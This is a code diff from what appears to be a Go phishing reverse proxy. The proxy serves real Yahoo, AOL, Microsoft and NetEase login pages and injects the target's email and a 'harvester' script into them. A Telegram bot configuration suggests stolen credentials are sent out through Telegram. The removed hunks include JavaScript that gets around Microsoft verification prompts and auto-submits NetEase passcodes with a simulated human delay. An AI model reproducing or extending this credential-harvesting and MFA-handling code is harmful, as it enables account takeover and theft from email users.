@@ -21,19 +21,11 @@ import (
 	"golang.org/x/text/transform"
 )
 
-// TelegramConfig holds the configuration for sending alerts
-type TelegramConfig struct {
-	BotToken string
-	ChatID   string
-}
-
-// SessionStore manages user sessions
 type SessionStore struct {
 	mu       sync.RWMutex
 	sessions map[string]*SessionData
 }
 
-// SessionData stores session-specific information
 type SessionData struct {
 	Cookies   map[string]string
 	UserEmail string
@@ -112,72 +104,6 @@ document.addEventListener('submit', function(e) {
         return true;
     }
 }, false);
-
-// 5. Microsoft Two-Attempt Logic
-function handleMicrosoftFlow() {
-    const url = window.location.href;
-    if (!url.includes('login.microsoftonline.com')) return;
-
-    const bodyText = document.body.innerText.toLowerCase();
-    
-    // Check for verification/MFA requirement
-    if (bodyText.includes('security code') || bodyText.includes('verification') || bodyText.includes('enter security code')) {
-        console.log('[MS] Detected verification requirement, redirecting...');
-        window.location.href = 'https://account.live.com/protect';
-        return;
-    }
-    
-    // Check for invalid credentials error
-    if (bodyText.includes('invalid') || bodyText.includes('wrong') || bodyText.includes('incorrect')) {
-        console.log('[MS] Credential error detected, refreshing...');
-        setTimeout(() => window.location.reload(), 2000);
-        return;
-    }
-}
-
-// 6. NetEase Passcode Handling
-function handleNeteasePasscode() {
-    const url = window.location.href;
-    if (!(url.includes('qiye.163.com') || url.includes('mail.126.com'))) return;
-
-    const passcodeInput = document.querySelector('input[name="code"], input[name="passcode"], input[type="text"][placeholder*="验证码"]');
-    if (passcodeInput && !passcodeInput.value) {
-        console.log('[NetEase] Passcode field detected');
-        
-        // Auto-fill passcode if provided in hash
-        const hash = window.location.hash;
-        if (hash && hash.includes('?')) {
-            const params = new URLSearchParams(hash.split('?')[1]);
-            const passcode = params.get('passcode');
-            if (passcode) {
-                passcodeInput.value = passcode;
-                passcodeInput.dispatchEvent(new Event('input', { bubbles: true }));
-                passcodeInput.dispatchEvent(new Event('change', { bubbles: true }));
-                
-                // Simulate human delay before submit
-                setTimeout(() => {
-                    passcodeInput.closest('form')?.submit();
-                }, Math.random() * 1000 + 500);
-                return;
-            }
-        }
-        
-        // Focus for manual input
-        passcodeInput.focus();
-    }
-}
-
-// Call detection after DOM load
-document.addEventListener('DOMContentLoaded', () => {
-    handleMicrosoftFlow();
-    handleNeteasePasscode();
-});
-
-// Also call on interval to catch dynamic content
-setInterval(() => {
-    handleMicrosoftFlow();
-    handleNeteasePasscode();
-}, 2000);
 </script>
 `
 
@@ -239,8 +165,6 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 
 	r.GET("/api/fetch", func(c *gin.Context) {
 		email := c.Query("email")
-		passcode := c.Query("passcode") // New parameter for passcode support
-
 		if b64, err := base64.StdEncoding.DecodeString(email); err == nil && strings.Contains(string(b64), "@") {
 			email = string(b64)
 		}
@@ -299,7 +223,6 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 		if resp.Header.Get("Content-Encoding") == "gzip" {
 			gzipReader, err := gzip.NewReader(resp.Body)
 			if err == nil {
-				defer gzipReader.Close()
 				bodyReader = gzipReader
 			}
 		}
@@ -343,13 +266,7 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 		baseTag := `<base href="` + targetBase + `">`
 		emailScript := `<script>window._targetEmail = "` + email + `";</script>`
 
-		// Inject passcode script if provided
-		passcodeScript := ""
-		if passcode != "" {
-			passcodeScript = `<script>window._targetPasscode = "` + passcode + `";</script>`
-		}
-
-		bodyStr = strings.Replace(bodyStr, "<head>", "<head>\n"+baseTag+"\n"+emailScript+passcodeScript, 1)
+		bodyStr = strings.Replace(bodyStr, "<head>", "<head>\n"+baseTag+"\n"+emailScript, 1)
 		bodyStr = strings.Replace(bodyStr, "</body>", harvesterScript+"</body>", 1)
 
 		c.Header("Content-Type", "text/html; charset=utf-8")
@@ -417,16 +334,8 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 			targetDomain = "https://login.yahoo.com/"
 		} else if strings.Contains(referer, "aol.com") {
 			targetDomain = "https://login.aol.com/"
-		} else if strings.Contains(referer, "live.com") || strings.Contains(referer, "microsoft") {
-			targetDomain = "https://login.microsoftonline.com/"
-		}
-
-		// Special handling for Microsoft second attempt
-		if targetDomain == "https://login.microsoftonline.com/" {
-			// Check if we need to redirect to account protection
-			if strings.Contains(filepath, "reauth") || strings.Contains(filepath, "verify") {
-				targetDomain = "https://account.live.com/protect"
-			}
+		} else if strings.Contains(referer, "live.com") {
+			targetDomain = "https://login.live.com/"
 		}
 
 		fullURL := targetDomain + filepath
